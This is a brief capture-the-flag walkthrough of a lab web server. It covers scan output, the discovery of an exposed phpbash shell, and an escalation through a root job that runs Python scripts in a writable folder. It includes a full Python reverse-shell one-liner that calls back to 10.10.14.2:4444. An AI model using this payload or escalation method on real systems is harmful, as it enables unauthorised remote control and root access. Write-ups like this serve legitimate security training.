Started with a nmap scan 
```
80 Apache httpd 2.4.18
```
All we have is a webserver its just a static website it looks like going to run a gobuster scan the site says something about `phpbash` found it on github its a shell to help with pentesting 
```
/index.html           (Status: 200) [Size: 7743]
/contact.html         (Status: 200) [Size: 7805]
/about.html           (Status: 200) [Size: 8193]
/uploads              (Status: 301) [Size: 312]
/php                  (Status: 301) [Size: 308]
/css                  (Status: 301) [Size: 308]
/dev                  (Status: 301) [Size: 308]
/js                   (Status: 301) [Size: 307]
/config.php           (Status: 200) [Size: 0]
/fonts                (Status: 301) [Size: 310
/single.html          (Status: 200) [Size: 7477]
```
Now we can run commands on the host and we can also read the user flag now time to get a reverse shell we can use this rev shell to get a callback ``python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`` running linpeas on the host did not find much but when I did `sudo -l` and we use the `scriptmanager` account to run commands as that account and there is a folder they control called `/scripts` and if we run `pspy` we can see root is running any script that is python `/bin/sh -c cd /scripts; for f in *.py; do python "$f"; done ` and its running as root so if we run `sudo -u scriptmanager bash -i` we now have a shell as `scriptmanager` and now we got a callback as root 